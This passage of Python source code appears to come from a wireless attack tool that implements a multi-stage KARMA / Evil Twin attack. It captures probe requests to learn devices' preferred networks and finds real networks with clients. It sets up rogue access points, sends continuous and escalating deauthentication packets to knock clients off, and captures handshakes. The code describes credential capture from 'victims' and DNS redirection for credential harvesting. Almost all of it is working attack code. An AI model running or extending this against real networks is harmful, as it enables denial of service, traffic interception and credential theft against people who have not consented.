                Color.pl('{+} {C}Searching for correct interface...{W}')
                available_interfaces = self.get_available_interfaces()
                if available_interfaces:
                    interface = available_interfaces[0]
                    Color.pl('{+} {G}Using available interface: {G}%s{W}' % interface)
                else:
                    Color.pl('{!} {R}No interfaces found{W}')
                    return False, interface
            
            # Try using iwconfig directly
            result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                                 capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                Color.pl('{+} {G}Successfully switched to monitor mode using iwconfig{W}')
                return True, interface
            else:
                Color.pl('{!} {O}iwconfig monitor mode failed: {O}%s{W}' % result.stderr.strip())
                
                # Try bringing interface down/up first
                Color.pl('{+} {C}Trying interface reset before monitor mode{W}')
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
                time.sleep(1)
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
                time.sleep(2)
                
                # Try iwconfig again
                result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                                     capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    Color.pl('{+} {G}Successfully switched to monitor mode after reset{W}')
                    return True, interface
                else:
                    Color.pl('{!} {O}iwconfig still failed after reset: {O}%s{W}' % result.stderr.strip())
            
            # Check if already in monitor mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                Color.pl('{+} {G}Interface is already in monitor mode{W}')
                return True, interface
            
            Color.pl('{!} {R}Failed to switch to monitor mode{W}')
            return False, interface
            
        except Exception as e:
            Color.pl('{!} {R}Error in fallback monitor mode: {O}%s{W}' % str(e))
            return False, interface
    
    def verify_interface_mode(self, interface, target_mode):
        """Verify interface mode - handles both string and list parameters"""
        try:
            Color.pl('{+} {C}Verifying interface mode for {G}%s{W}...{W}' % interface)
            
            # Handle both string and list parameters
            if isinstance(target_mode, list):
                target_modes = target_mode
            else:
                target_modes = [target_mode]
            
            # First, try to verify with the given interface name
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                Color.pl('{+} {C}Debug: iwconfig output: {G}%s{W}' % result.stdout.strip())
                
                # Check if interface is in any of the target modes
                for mode in target_modes:
                    if mode.lower() == 'managed':
                        if 'Mode:Monitor' not in result.stdout and 'Mode:Master' not in result.stdout:
                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in managed mode{W}' % interface)
                            return True
                    elif mode.lower() == 'monitor':
                        if 'Mode:Monitor' in result.stdout:
                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in monitor mode{W}' % interface)
                            return True
                    elif mode.lower() in ['master', 'ap']:
                        if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in AP mode{W}' % interface)
                            return True
                
                Color.pl('{!} {R}✗ Interface not in target mode{W}')
                return False
            else:
                Color.pl('{!} {R}✗ Could not get interface status for {G}%s{W}' % interface)
                Color.pl('{!} {O}Debug: iwconfig stderr: {O}%s{W}' % result.stderr.strip())
            return False
            
        except Exception as e:
            Color.pl('{!} {R}Error in verify_interface_mode: {O}%s{W}' % str(e))
            return False
    
    def find_correct_interface_for_verification(self, target_mode):
        """Dynamically find the correct interface for verification"""
        try:
            Color.pl('{+} {C}Scanning system for correct interface...{W}')
            
            # Get all current interfaces
            current_interfaces = self.get_available_interfaces()
            if not current_interfaces:
                Color.pl('{!} {R}No interfaces found{W}')
                return None
            
            Color.pl('{+} {C}Found interfaces: {G}%s{W}' % ', '.join(current_interfaces))
            
            # Check each interface to find one in the target mode
            for interface in current_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0:
                        Color.pl('{+} {C}Checking interface {G}%s{W}: {O}%s{W}' % (interface, result.stdout.strip()))
                        
                        if target_mode == 'managed':
                            if 'Mode:Monitor' not in result.stdout:
                                Color.pl('{+} {G}Found managed interface: {G}%s{W}' % interface)
                                return interface
                        elif target_mode == 'monitor':
                            if 'Mode:Monitor' in result.stdout:
                                Color.pl('{+} {G}Found monitor interface: {G}%s{W}' % interface)
                                return interface
                except Exception as e:
                    Color.pl('{!} {O}Error checking interface %s: {O}%s{W}' % (interface, str(e)))
                    continue
            
            # If no interface found in target mode, return the first available one
            if current_interfaces:
                Color.pl('{+} {C}No interface found in target mode, using first available: {G}%s{W}' % current_interfaces[0])
                return current_interfaces[0]
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error in find_correct_interface_for_verification: {O}%s{W}' % str(e))
            return None
    
    def switch_interface_mode(self, target_mode, phase_name=""):
        """Unified interface mode switching for different attack phases"""
        try:
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                from ..gui.utils import SystemUtils
                interfaces = SystemUtils.get_wireless_interfaces()
                interface = interfaces[0] if interfaces else None
            
            # Clean up interface name to prevent wlan0monmon issues
            interface = self.cleanup_interface_name(interface)
            
            # Check if we have a valid interface
            if not interface:
                Color.pl('{!} {R}No interface available for mode switching{W}')
                return False
            
            if phase_name:
                Color.pl('{+} {C}%s: Switching interface to %s mode{W}' % (phase_name, target_mode))
            
            # Debug: Show current interface status
            Color.pl('{+} {C}Debug: Current interface: {G}%s{W}' % interface)
            current_state = self.get_interface_state(interface)
            Color.pl('{+} {C}Debug: Current state: {G}%s{W}' % current_state)
            
            # Kill conflicting processes first
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            # Clean up any remaining wireless processes
            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
            time.sleep(2)
            
            # Check NetworkManager status
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}NetworkManager is running - may interfere{W}')
                else:
                    Color.pl('{+} {G}NetworkManager is not running - no conflict{W}')
            except:
                pass
            
            # Bring interface down
            try:
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
                time.sleep(1)
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to bring interface down: {R}%s{W}' % str(e))
            
            # Set mode based on target
            if target_mode == 'managed':
                # For managed mode, use comprehensive switching approach
                success, actual_interface = self.switch_to_managed_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to managed mode{W}')
                    return False
                interface = actual_interface  # Use the actual interface name found
                    
            elif target_mode == 'monitor':
                # For monitor mode, use iwconfig directly
                success, actual_interface = self.switch_to_monitor_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to monitor mode{W}')
                    return False
                interface = actual_interface  # Use the actual interface name found
            elif target_mode == 'master':
                # For master mode (AP mode), use iwconfig
                success = self.switch_to_master_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to master mode{W}')
                    return False
            else:
                Color.pl('{!} {R}Unknown target mode: %s{W}' % target_mode)
                return False
            
            # Bring interface back up
            try:
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
                time.sleep(2)
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to bring interface up: {R}%s{W}' % str(e))
                # Try alternative method
                try:
                    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True, timeout=5)
                    Color.pl('{+} {G}Interface brought up using alternative method{W}')
                except Exception as e2:
                    Color.pl('{!} {R}Failed to bring interface up with alternative method: {O}%s{W}' % str(e2))
            
            # Comprehensive verification of mode change
            return self.verify_interface_mode(interface, target_mode)
                
        except Exception as e:
            Color.pl('{!} {O}Error switching interface mode: {O}%s{W}' % str(e))
            return False
    
    def switch_to_master_mode(self, interface):
        """Switch interface to master mode (AP mode) for hostapd"""
        try:
            Color.pl('{+} {C}Switching to master mode (AP mode) for hostapd{W}')
            
            # First, bring interface down
            subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
            time.sleep(1)
            
            # Try to set type __ap with iw (modern approach)
            try:
                Color.pl('{+} {C}Attempting to set AP mode using iw...{W}')
                subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, timeout=5)
                time.sleep(1)
                # Verify mode change
                if self.verify_interface_mode(interface, ['Master', 'AP']):
                    Color.pl('{+} {G}Successfully set AP mode using iw for {G}%s{W}' % interface)
                    return True
                else:
                    Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
            except Exception as e:
                Color.pl('{!} {O}iw command failed: {O}%s{W}' % str(e))
                Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
            
            # Fallback to iwconfig (legacy approach)
            try:
                Color.pl('{+} {C}Attempting to set AP mode using iwconfig...{W}')
                subprocess.run(['iwconfig', interface, 'mode', 'master'], capture_output=True, timeout=5)
                time.sleep(1)
                # Verify mode change
                if self.verify_interface_mode(interface, ['Master', 'AP']):
                    Color.pl('{+} {G}Successfully set AP mode using iwconfig for {G}%s{W}' % interface)
                    return True
                else:
                    Color.pl('{!} {R}Failed to set master mode{W}')
                    return False
            except Exception as e:
                Color.pl('{!} {R}Failed to set master mode: {O}%s{W}' % str(e))
                return False
            
        except Exception as e:
            Color.pl('{!} {R}Error switching to master mode: {O}%s{W}' % str(e))
            return False
    
    def stop_probe_capture(self):
        """Stop any active probe capture processes"""
        try:
            Color.pl('{+} {C}Stopping probe capture processes{W}')
            
            # Kill airodump processes
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            
            # Kill tshark processes
            subprocess.run(['pkill', '-f', 'tshark'], capture_output=True)
            
            # Kill any other wireless monitoring processes
            # Clean up any remaining wireless processes
            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
            
            # Give processes time to terminate
            time.sleep(2)
            
            Color.pl('{+} {G}Probe capture processes stopped{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error stopping probe capture: {O}%s{W}' % str(e))
            return False

    def get_additional_interfaces_for_aps(self):
        """Get additional interfaces for multiple APs"""
        try:
            additional = []
            used_interfaces = {self.probe_interface, self.rogue_interface}
            
            for interface in self.available_interfaces:
                if interface not in used_interfaces:
                    additional.append(interface)
            
            if additional:
                Color.pl('{+} {G}Found {C}%d{W} additional interfaces for multiple APs: {G}%s{W}' % 
                        (len(additional), ', '.join(additional)))
            
            return additional
            
        except Exception as e:
            Color.pl('{!} {R}Error getting additional interfaces: {O}%s{W}' % str(e))
            return []
    
    def show_interface_configuration(self):
        """Show the final interface configuration"""
        try:
            Color.pl('\n{+} {C}=== KARMA Interface Configuration ==={W}')
            Color.pl('{+} {C}Probe Interface:{W} {G}%s{W} (for capturing probe requests)' % self.probe_interface)
            Color.pl('{+} {C}Rogue Interface:{W} {G}%s{W} (for hosting Evil Twin AP)' % self.rogue_interface)
            
            if self.additional_interfaces:
                Color.pl('{+} {C}Additional Interfaces:{W} {G}%s{W} (for multiple APs)' % ', '.join(self.additional_interfaces))
            
            Color.pl('{+} {C}=== End Configuration ==={W}\n')
            
        except Exception as e:
            Color.pl('{!} {R}Error showing interface configuration: {O}%s{W}' % str(e))
        
    def run(self):
        """Main KARMA attack execution - Complete Multi-Stage Evil Twin Attack"""
        # Prevent duplicate execution
        if self._attack_started:
            Color.pl('{!} {R}KARMA attack already started - preventing duplicate execution{W}')
            return False
        
        self._attack_started = True
        
        # Ensure cleanup runs on exit/interrupts
        self._register_cleanup_handlers()
        try:
            Color.pl('\n{+} {C}Starting Enhanced KARMA Attack (Complete Evil Twin){W}')
            Color.pl('{+} {C}Probe Interface:{W} {G}%s{W}' % self.probe_interface)
            Color.pl('{+} {C}Rogue AP Interface:{W} {G}%s{W}' % self.rogue_interface)
            
            # Explain what KARMA does
            Color.pl('\n{+} {C}KARMA Attack Overview:{W}')
            Color.pl('{+} {C}This attack creates Evil Twin APs based on nearby devices, not just your selected target{W}')
            Color.pl('{+} {C}The attack will:{W}')
            Color.pl('  {G}1. Capture probe requests from nearby devices{W}')
            Color.pl('  {G}2. Find real networks with active clients{W}')
            Color.pl('  {G}3. Create Evil Twin APs to trick devices into connecting{W}')
            Color.pl('  {G}4. Capture credentials and handshakes from connected victims{W}')
            
            # Show user's selected target if available
            if hasattr(self, 'target') and self.target and self.target.essid:
                Color.pl('\n{+} {C}Your selected target: {G}%s{W} (will be prioritized if found during scanning){W}' % self.target.essid)
                Color.pl('{+} {O}Note: KARMA will still create Evil Twins for other networks to maximize effectiveness{W}')
            else:
                Color.pl('\n{+} {O}No specific target selected - KARMA will automatically choose the best networks{W}')
            
            # Use pattack for GUI logging integration
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Starting Enhanced KARMA', 'Multi-Stage Evil Twin')
            
            # Check if we have optimal dual-interface setup
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}Single interface mode detected - will use phase-based mode switching{W}')
                Color.pl('{!} {O}Phase 1-2: Monitor mode (probe capture){W}')
                Color.pl('{!} {O}Phase 3+: Managed mode (rogue AP) - will pause probe capture{W}')
                self.single_interface_mode = True
            else:
                Color.pl('{+} {G}Dual interface mode detected - optimal setup!{W}')
                Color.pl('{+} {G}Probe capture and rogue AP will run simultaneously{W}')
                Color.pl('{+} {G}Interface {C}%s{W}: Probe capture (monitor mode){W}' % self.probe_interface)
                Color.pl('{+} {G}Interface {C}%s{W}: Rogue AP (managed mode){W}' % self.rogue_interface)
                self.single_interface_mode = False
            
            # Stage 1: Passive PNL Capture
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 1', 'Capturing PNL data')
            if not self.capture_probe_requests():
                Color.pl('{!} {R}Failed to capture sufficient probe requests{W}')
                # Try fallback attack mode
                Color.pl('{+} {O}Attempting fallback attack mode...{W}')
                if not self.fallback_attack_mode():
                    Color.pl('{!} {R}Fallback attack mode also failed{W}')
                    self.cleanup()
                    return False
                else:
                    Color.pl('{+} {G}Fallback attack mode activated{W}')
                    self._fallback_mode_used = True
            
            # Stage 2: Identify Real Networks with Clients (skip if fallback already handled this)
            if not self._fallback_mode_used:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Stage 2', 'Scanning for real networks')
                if not self.identify_real_networks():
                    Color.pl('{!} {R}No real networks with clients found{W}')
                    # Try fallback attack mode
                    Color.pl('{+} {O}Attempting fallback attack mode...{W}')
                    if not self.fallback_attack_mode():
                        Color.pl('{!} {R}Fallback attack mode also failed{W}')
                        self.cleanup()
                        return False
                    else:
                        Color.pl('{+} {G}Fallback attack mode activated{W}')
                        self._fallback_mode_used = True
            else:
                Color.pl('{+} {G}Skipping Stage 2 - already handled by fallback mode{W}')
            
            # Stage 3: Setup Evil Twin Infrastructure
            if self.single_interface_mode:
                # Single interface: Switch to rogue AP mode
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to switch to rogue AP mode{W}')
                    self.cleanup()
                    return False
            else:
                # Dual interface: Setup rogue AP on separate interface
                Color.pl('{+} {C}Setting up rogue AP on separate interface {G}%s{W}...{W}' % self.rogue_interface)
                
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 3', 'Setting up Evil Twin')
            if not self.setup_rogue_ap():
                Color.pl('{!} {R}Failed to setup Evil Twin infrastructure{W}')
                self.cleanup()
                return False
            
            # Phase 3: DNS Spoofing Setup (if enabled)
            Color.pl('\n{+} {C}Phase 3: DNS Spoofing Setup{W}')
            if Configuration.karma_dns_spoofing:
                Color.pl('{+} {G}DNS spoofing enabled - DNS redirection is active{W}')
                Color.pl('{+} {C}All victim DNS queries will be redirected to rogue web server{W}')
                Color.pl('{+} {C}This enables credential harvesting from HTTP/HTTPS traffic{W}')
            else:
                Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
            
            # Stage 4: Deauthentication Attack
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 4', 'Starting deauth attack')
            if not self.start_deauth_attack():
                Color.pl('{!} {R}Failed to start deauthentication attack{W}')
                self.cleanup()
                return False
            
            # Stage 5: Handshake Capture & Monitoring
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 5', 'Handshake capture active')
            self.start_handshake_capture()
            
            # Stage 5.5: Start Web Server for Credential Harvesting (if enabled)
            # DISABLED: Web interface at 10.0.0.1 removed
            # if getattr(Configuration, 'karma_credential_harvesting', False):
            #     if hasattr(self, 'target') and self.target:
            #         Color.pattack('KARMA', self.target, 'Stage 5.5', 'Starting credential harvesting web server')
            #     self.start_credential_harvesting_server()
            
            # Stage 6: Complete Monitoring & Analysis
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 6', 'Full monitoring active')
            
            # Show capture directories info
            Color.pl('\n{+} {C}Capture Directories:{W}')
            Color.pl('  {G}Credentials:{W} {C}%s{W}' % Configuration.karma_credentials_dir)
            Color.pl('  {G}Handshakes:{W} {C}%s{W}' % Configuration.karma_handshakes_dir)
            Color.pl('  {G}Traffic:{W} {C}%s{W}' % Configuration.karma_traffic_dir)
            Color.pl('  {G}Live Monitoring:{W} {C}%s{W}' % os.path.join(Configuration.karma_captures_dir, 'live_monitoring'))
            
            if self.single_interface_mode:
                self.start_monitoring()
            else:
                self.start_dual_interface_monitoring()
            
        except Exception as e:
            Color.pl('{!} {R}Enhanced KARMA attack failed: {O}%s{W}' % str(e))
            self.cleanup()
            return False
        finally:
            self.cleanup()
            
        return self.success

    def _register_cleanup_handlers(self):
        """Register atexit and signal handlers to guarantee cleanup"""
        def _safe_cleanup(signum=None, frame=None):
            try:
                self.cleanup()
            except Exception:
                pass
        try:
            atexit.register(_safe_cleanup)
        except Exception:
            pass
        # Best-effort signal hooks
        for sig in (getattr(signal, 'SIGINT', None), getattr(signal, 'SIGTERM', None)):
            if sig is None:
                continue
            try:
                signal.signal(sig, _safe_cleanup)
            except Exception:
                pass
    
    def capture_probe_requests(self):
        """Capture probe requests to extract PNL"""
        Color.pl('\n{+} {C}Phase 1: Capturing probe requests to extract PNL{W}')
        
        # Use airodump to capture probe requests (without -a flag to capture all frames)
        with Airodump(interface=self.probe_interface, 
                     output_file_prefix='karma_probes',
                     delete_existing_files=True) as airodump:
            
            # Use timeout from GUI settings (respect user's choice)
            probe_timeout = Configuration.karma_probe_timeout
            timer = Timer(probe_timeout)
            Color.pl('{+} {C}Capturing probe requests for {G}%d{W} seconds...' % probe_timeout)
            
            while not timer.ended() and self.running:
                # Parse captured packets for probe requests
                cap_files = airodump.find_files(endswith='.cap')
                if cap_files:
                    self.parse_probe_requests(cap_files[0])
                
                # Show progress
                if len(self.pnl_networks) > 0:
                    Color.clear_entire_line()
                    Color.p('{+} {C}Captured {G}%d{W} unique SSIDs from probe requests...' % len(self.pnl_networks))
                    
                    # GUI logging
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'PNL Capture', f'Found {len(self.pnl_networks)} SSIDs')
                
                time.sleep(2)
            
            Color.pl('')  # New line after progress
            
            # Save probe captures to permanent directory
            cap_files = airodump.find_files(endswith='.cap')
            if cap_files:
                self.save_probe_captures(cap_files[0])
            
            if len(self.pnl_networks) >= Configuration.karma_min_probes:
                Color.pl('{+} {G}Successfully captured {C}%d{W} networks from PNL{W}' % len(self.pnl_networks))
                for ssid in sorted(self.pnl_networks):
                    Color.pl('  {G}* {W}%s' % ssid)
                
                # GUI logging for phase completion
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'PNL Capture', f'Complete - {len(self.pnl_networks)} networks captured')
                
                return True
            else:
                Color.pl('{!} {R}Only captured {O}%d{W} probe requests, need at least {O}%d{W}' % 
                        (len(self.pnl_networks), Configuration.karma_min_probes))
                return False
    
    def parse_probe_requests(self, capfile):
        """Parse probe requests from PCAP file using tshark - Enhanced implementation"""
        if not Tshark.exists():
            Color.pl('{!} {R}Warning: tshark not found, cannot parse probe requests{W}')
            return
        
        try:
            # Enhanced tshark command with better filtering
            command = [
                'tshark',
                '-r', capfile,
                '-n',  # Don't resolve addresses
                '-Y', 'wlan.fc.type_subtype == 0x04 and wlan.ssid != "" and wlan.ssid != "<MISSING>"',  # Better filtering
                '-T', 'fields',
                '-e', 'wlan.sa',  # Source MAC
                '-e', 'wlan.ssid',  # SSID
                '-e', 'wlan.ta'  # Transmitter address (for debugging)
            ]
            
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=30)  # Add timeout
            
            if process.returncode != 0:
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}tshark error: {O}%s{W}' % stderr.strip())
                return
            
            parsed_count = 0
            for line in stdout.split('\n'):
                line = line.strip()
                if not line or '\t' not in line:
                    continue
                
                parts = line.split('\t')
                if len(parts) >= 2:
                    client_mac = parts[0].strip()
                    ssid = parts[1].strip()
                    
                    # Enhanced MAC validation
                    if not self.is_valid_mac(client_mac):
                        continue
                    
                    if client_mac and ssid and ssid != '' and ssid != '<MISSING>':
                        # Enhanced SSID decoding
                        readable_ssid = self.decode_hex_ssid(ssid)
                        
                        # Skip empty or invalid SSIDs
                        if readable_ssid and len(readable_ssid.strip()) > 0 and readable_ssid != '<MISSING>':
                            self.client_probes[client_mac].append(readable_ssid)
                            self.pnl_networks.add(readable_ssid)
                            parsed_count += 1
            
            if parsed_count > 0 and Configuration.verbose > 1:
                Color.pl('{+} {C}Parsed {G}%d{W} probe requests{W}' % parsed_count)
                
        except subprocess.TimeoutExpired:
            Color.pl('{!} {R}Probe parsing timeout - file may be too large{W}')
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error parsing probe requests: {O}%s{W}' % str(e))
    
    def is_valid_mac(self, mac):
        """Check if MAC address is valid"""
        try:
            if not mac or len(mac) != 17:
                return False
            
            # Check format: XX:XX:XX:XX:XX:XX
            parts = mac.split(':')
            if len(parts) != 6:
                return False
            
            for part in parts:
                if len(part) != 2:
                    return False
                try:
                    int(part, 16)
                except ValueError:
                    return False
            
            return True
        except:
            return False
    
    def identify_real_networks(self):
        """Identify real networks with active clients for deauth targeting"""
        Color.pl('\n{+} {C}Stage 2: Identifying real networks with active clients{W}')
        
        try:
            # Use airodump to scan for networks with clients
            with Airodump(interface=self.probe_interface,
                         output_file_prefix='karma_real_networks',
                         delete_existing_files=True) as airodump:
                
                timer = Timer(15)  # Increased to 15 seconds for better client detection
                Color.pl('{+} {C}Scanning for real networks with clients...{W}')
                
                # Monitor progress and show updates
                last_update = 0
                while not timer.ended() and self.running:
                    time.sleep(2)
                    
                    # Show progress every 5 seconds
                    if time.time() - last_update >= 5:
                        remaining = timer.remaining()
                        Color.pl('{+} {C}Scanning... {O}%d{W} seconds remaining{W}' % remaining)
                        last_update = time.time()
                
                # Get discovered targets
                targets = airodump.get_targets()
                Color.pl('{+} {C}Parsed {G}%d{W} total networks from scan{W}' % len(targets))
                
                # Filter for networks with clients
                networks_with_clients = []
                for target in targets:
                    if target.clients and target.essid_known and target.essid:
                        # Only target networks that have clients and known SSIDs
                        networks_with_clients.append(target)
                        self.real_networks.append(target)
                        Color.pl('{+} {G}Found real network: {C}%s{W} ({C}%s{W}) with {G}%d{W} clients{W}' % 
                                (target.essid, target.bssid, len(target.clients)))
                        
                        # Show clients
                        for client in target.clients:
                            Color.pl('  {G}* {W}Client: {C}%s{W}' % client.station)
                
                # Also check for unassociated clients (probe requests) - these are VALUABLE for KARMA!
                unassociated_targets = [t for t in targets if t.bssid == 'UNASSOCIATED' and t.clients]
                if unassociated_targets:
                    unassociated_target = unassociated_targets[0]
                    Color.pl('{+} {G}Found {C}%d{W} unassociated clients (active probe requests - perfect for KARMA!){W}' % len(unassociated_target.clients))
                    Color.pl('{+} {C}These devices are actively searching for networks - ideal KARMA victims!{W}')
                    for client in unassociated_target.clients:
                        Color.pl('  {G}* {W}Probing device: {C}%s{W}' % client.station)
                    Color.pl('{+} {C}These unassociated clients will connect to your Evil Twin APs!{W}')
                
                # Mark that networks have been scanned
                self._networks_scanned = True
                
                if self.real_networks:
                    Color.pl('{+} {G}Found {C}%d{W} real networks with clients for targeting{W}' % len(self.real_networks))
                    
                    # GUI logging for phase completion
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Network Scan', f'Complete - {len(self.real_networks)} networks with clients found')
                    
                    return True
                else:
                    Color.pl('{!} {R}No real networks with clients found{W}')
                    Color.pl('{!} {O}This may be due to:{W}')
                    Color.pl('{!} {O}  - No active clients in the area{W}')
                    Color.pl('{!} {O}  - Clients are on different channels{W}')
                    Color.pl('{!} {O}  - Scan duration too short{W}')
                    Color.pl('{!} {O}  - Interface not properly configured{W}')
                    return False
                    
        except Exception as e:
            Color.pl('{!} {R}Error identifying real networks: {O}%s{W}' % str(e))
            import traceback
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Debug traceback:{W}')
                Color.pl(traceback.format_exc())
            return False
    
    def start_deauth_attack(self):
        """Start simple aggressive deauthentication attack to force clients to disconnect"""
        Color.pl('\n{+} {C}Stage 4: Starting aggressive deauthentication attack{W}')
        
        try:
            self.deauth_active = True
            
            if not self.real_networks:
                Color.pl('{!} {R}No real networks to target{W}')
                return False
            
            Color.pl('{+} {C}Targeting {G}%d{W} real networks with aggressive deauth packets{W}' % len(self.real_networks))
            Color.pl('{+} {C}Using continuous deauth approach for maximum effectiveness{W}')
            
            # Start continuous deauth immediately - no overlap
            self.start_continuous_deauth()
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error in deauth attack: {O}%s{W}' % str(e))
            return False
    
    def start_continuous_deauth(self):
        """Start continuous deauth in background to keep clients disconnected - OLD CODE APPROACH"""
        try:
            Color.pl('{+} {C}Starting continuous deauth to keep clients disconnected{W}')
            
            # Start continuous deauth thread
            deauth_thread = threading.Thread(target=self.continuous_deauth_worker)
            deauth_thread.daemon = True
            deauth_thread.start()
            
            Color.pl('{+} {G}Continuous deauth started - clients will be kept disconnected{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error starting continuous deauth: {O}%s{W}' % str(e))
    
    def continuous_deauth_worker(self):
        """Continuous deauth worker - kicks clients immediately, then every 5 seconds"""
        try:
            first_run = True
            
            while self.deauth_active and self.running:
                # On first run, don't wait - kick clients immediately
                if not first_run:
                    # Wait 5 seconds between deauth rounds
                    time.sleep(5)
                else:
                    first_run = False
                
                if not self.deauth_active or not self.running:
                    break
                
                # Kick clients from all networks
                if hasattr(self, 'real_networks') and self.real_networks:
                    for network in self.real_networks:
                        if network.clients:
                            Color.pl('{+} {C}Continuous deauth: Kicking clients from {G}%s{W}' % network.essid)
                            self.kick_clients_from_network(network)
                            
                            if hasattr(self, 'target') and self.target:
                                Color.pattack('KARMA', self.target, 'Continuous Deauth', f'Kicked clients from {network.essid}')
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in continuous deauth worker: {O}%s{W}' % str(e))
    
    def adaptive_deauth_network_clients(self, network):
        """Send adaptive deauth packets with balanced approach - give clients time to connect"""
        try:
            Color.pl('{+} {C}Starting adaptive deauth attack on {G}%s{W} ({C}%s{W}){W}' % 
                    (network.essid, network.bssid))
            
            deauth_count = 0
            last_connection_check = time.time()
            no_connection_duration = 0
            last_deauth_time = 0
            deauth_interval = 10  # Start with 10 second intervals between deauth rounds
            
            while self.deauth_active and self.running:
                current_time = time.time()
                
                # Check if we have any connected clients (every 30 seconds)
                if current_time - last_connection_check >= 30:
                    connected_clients = len(self.connected_clients)
                    last_connection_check = current_time
                    
                    if connected_clients == 0:
                        no_connection_duration += 30
                        # Escalate attack intensity if no clients connected
                        self.escalate_deauth_intensity(network, no_connection_duration)
                        # Reduce deauth interval for more aggressive attacks
                        deauth_interval = max(5, 15 - (no_connection_duration // 30))
                    else:
                        no_connection_duration = 0  # Reset if clients connected
                        self.deauth_intensity[network.bssid] = max(1, self.deauth_intensity[network.bssid] - 1)  # Reduce intensity
                        # Increase deauth interval when clients are connected
                        deauth_interval = min(20, deauth_interval + 2)
                
                # Only send deauth packets at intervals to give clients time to connect
                if current_time - last_deauth_time >= deauth_interval:
                    last_deauth_time = current_time
                
                # Send deauth packets based on current intensity
                intensity = self.deauth_intensity[network.bssid]
                packets_per_round = min(intensity * 2, 10)  # Reduced max packets per round
                
                for client in network.clients:
                    try:
                        # Send fewer deauth packets to avoid overwhelming
                        for i in range(packets_per_round):
                            self.send_adaptive_deauth(network, client, intensity)
                            deauth_count += 1
                            
                            # Longer delay between packets
                            time.sleep(0.2)
                            
                            # Log deauth activity every 10 packets (reduced frequency)
                            if deauth_count % 10 == 0:
                                Color.pl('{+} {C}Deauth sent to {G}%s{W} - waiting {G}%d{W}s for connections' % 
                                        (network.essid, deauth_interval))
                        
                    except Exception as e:
                        if Configuration.verbose > 1:
                            Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
                                        (client.station, str(e)))
                
                # Longer sleep to give clients time to connect
                sleep_time = max(5, deauth_interval)  # Minimum 5 second sleep
                time.sleep(sleep_time)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in adaptive deauth thread: {O}%s{W}' % str(e))
    
    def escalate_deauth_intensity(self, network, no_connection_duration):
        """Escalate deauth attack intensity based on time without connections"""
        try:
            current_intensity = self.deauth_intensity[network.bssid]
            
            # Escalate intensity based on time without connections
            if no_connection_duration >= 60 and current_intensity < 3:  # After 1 minute
                self.deauth_intensity[network.bssid] = 3
                Color.pl('{+} {O}Escalating deauth intensity to {G}3{W} for {G}%s{W} (no connections for 60s)' % network.essid)
            elif no_connection_duration >= 120 and current_intensity < 5:  # After 2 minutes
                self.deauth_intensity[network.bssid] = 5
